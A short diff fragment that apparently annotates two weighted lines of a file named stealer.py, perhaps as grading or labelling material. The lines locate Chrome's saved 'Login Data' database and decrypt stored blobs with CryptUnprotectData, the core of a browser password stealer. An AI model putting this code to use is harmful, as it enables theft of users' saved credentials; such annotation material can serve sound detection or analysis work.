@@ -1,0 +1,6 @@
+# path: stealer.py
+# lines: 1, 2
+# weight: 40
+# ---
+db = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")
+plain = win32crypt.CryptUnprotectData(blob, None, None, None, 0)
